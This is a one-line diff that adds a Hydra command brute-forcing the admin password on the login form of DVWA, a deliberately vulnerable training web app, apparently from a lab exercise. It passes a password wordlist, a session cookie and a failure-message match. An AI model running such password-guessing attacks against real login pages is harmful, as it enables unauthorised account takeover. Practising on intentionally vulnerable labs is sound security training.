@@ -1,0 +1,1 @@
+hydra -l admin -P /home/kali/passwords.txt 'http-get-form://<IP address>/DVWA/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:H=Cookie\:PHPSESSID=u4vu8m14tmctnu0b05918v4; security=low:F=Username and/or password incorrect'
